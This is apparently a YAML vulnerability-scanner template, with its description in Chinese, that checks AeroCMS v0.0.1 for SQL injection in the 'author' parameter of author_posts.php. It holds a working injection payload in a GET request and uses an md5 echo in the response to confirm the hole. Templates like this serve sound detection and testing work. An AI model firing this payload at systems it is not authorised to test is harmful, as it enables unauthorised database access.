expression: r0()
id: aero-cms-frontend-sql-injection
info:
  author: daffainfo
  description: "AeroCMS v0.0.1 \u88AB\u53D1\u73B0\u901A\u8FC7 \\author_posts.php \u4E2D\
    \u7684\u201Cauthor\u201D\u53C2\u6570\u5305\u542B SQL \u6CE8\u5165\u6F0F\u6D1E\u3002\
    \u8BE5\u6F0F\u6D1E\u4F7F\u653B\u51FB\u8005\u65E0\u9700\u8EAB\u4EFD\u9A8C\u8BC1\
    \u5373\u53EF\u83B7\u5F97\u6570\u636E\u5E93\u7BA1\u7406\u5458\u6743\u9650\u5E76\
    \u8BBF\u95EE\u6570\u636E\u5E93\u4FE1\u606F\u3002"
  name: "AeroCMS v0.0.1 \u524D\u7AEFsql\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - https://github.com/MegaTKC/AeroCMS/issues/6
  severity: high
  verified: false
rules:
  r0:
    expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    request:
      method: GET
      path: /author_posts.php?author=admin' AND (SELECT 9591 FROM (SELECT(md5({{s1}})))ONHE)--
        jqaW&p_id=1
set:
  s1: randomInt(100000, 200000)
